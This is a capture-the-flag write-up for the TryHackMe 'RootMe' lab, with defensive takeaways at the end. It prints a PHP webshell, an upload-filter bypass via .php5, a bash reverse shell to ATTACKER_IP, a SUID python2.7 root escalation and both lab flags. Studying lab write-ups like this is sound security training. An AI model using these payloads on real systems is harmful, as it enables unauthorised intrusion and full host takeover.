# RootMe — TryHackMe Writeup

**Platform:** TryHackMe | **Difficulty:** Easy | **Tags:** Linux, Web, PrivEsc

---

## Attack Chain

`recon` → `file upload bypass` → `RCE via webshell` → `reverse shell` → `SUID python2.7` → `root`

---

## Reconnaissance

### 1. Nmap TCP scan

```
$ nmap -sV -sC -p- rootme.thm

22/tcp  open  ssh   OpenSSH 8.2p1 Ubuntu
80/tcp  open  http  Apache/2.4.41
```

Two ports open. SSH on 22 and Apache on 80. HTTP is the attack surface.

### 2. Directory enumeration

```
/panel/    → file upload interface
/uploads/  → uploaded files, directly accessible
```

Two interesting paths: `/panel/` (file upload form) and `/uploads/` (where files land). Exactly what we need.

---

## Initial Foothold — File Upload Bypass

### 3. Extension filter bypass

The upload panel rejects `.php` files. The filter is extension-based and case-sensitive. Apache on Ubuntu is configured to execute `.php5` as PHP — and the filter doesn't block it. A mixed-case attempt (`.pHp5`) also works, confirming it's a naive blocklist.

```
test.php   → blocked
test.pHp5  → accepted ✓  (filter bypass via case)
test.php5  → accepted ✓  (filter bypass via alt ext)
```

### 4. Webshell upload & RCE verification

Uploaded a minimal PHP webshell as `test124.php5`, then confirmed RCE via curl.

```php
<?php echo '<pre>'; system($_GET['cmd']); echo '</pre>'; ?>
```

```
$ curl "http://rootme.thm/uploads/test124.php5?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 5. Reverse shell

Used the webshell to trigger a reverse shell, then upgraded to a full TTY.

```bash
# listener
nc -nlvp 1234

# payload (sent via cmd param)
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/1234 0>&1'

# upgrade sequence
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
stty rows 58 cols 109
export TERM=xterm
```

---

## User Flag

**Location:** `/var/www/user.txt`

```
www-data$ cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
```

---

## Privilege Escalation — SUID python2.7

### 6. SUID enumeration

Standard SUID sweep. Most results are snap internals. One stands out immediately: `/usr/bin/python2.7` with SUID set as root.

```
www-data$ find / -perm -4000 2>/dev/null | xargs ls -lah
...
-rwsr-xr-x 1 root root 3.5M  /usr/bin/python2.7   ← this one
...
```

> `python2.7` with SUID root is a textbook GTFOBins escalation. `os.execl` drops you into a root shell because the SUID bit carries over.

### 7. Root shell via os.execl

One-liner from GTFOBins. Spawns a shell with the SUID-inherited UID of root.

```
www-data$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root)
# cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```

---

## Flags

| Flag | Value |
|------|-------|
| User | `THM{y0u_g0t_a_sh3ll}` |
| Root | `THM{pr1v1l3g3_3sc4l4t10n}` |

---

## Key Takeaways

**Blocklist vs allowlist** — The upload filter used a blocklist of extensions. Allowlists (only permit jpg/png/gif) are the correct approach — blocklists will always have gaps like `.php5`, `.phtml`, `.phar`.

**Uploaded files should never be web-executable** — Store uploads outside the webroot, or configure Apache/Nginx to never execute files in the uploads directory. A PHP file that can't be requested over HTTP is harmless.

**SUID on interpreters = instant root** — Never set SUID on general-purpose binaries like Python, Perl, or Ruby. Any interpreter with SUID can trivially spawn a privileged shell. Audit with `find / -perm -4000` regularly.
